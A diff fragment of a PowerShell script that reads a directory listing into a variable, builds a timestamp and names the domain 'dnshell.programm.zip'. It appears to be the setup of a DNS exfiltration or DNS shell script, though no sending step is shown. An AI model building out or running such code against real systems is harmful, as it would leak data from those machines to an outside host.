@@ -1,5 +1,5 @@
 
-$data = Get-Childitem C:\Windows | Out-String
+$data = Get-Childitem C:\temp\ | Out-String
 
 $timestamp = [DateTime]::UtcNow.ToString("yyyyMMddHHmmss")
 $domain = "dnshell.programm.zip"
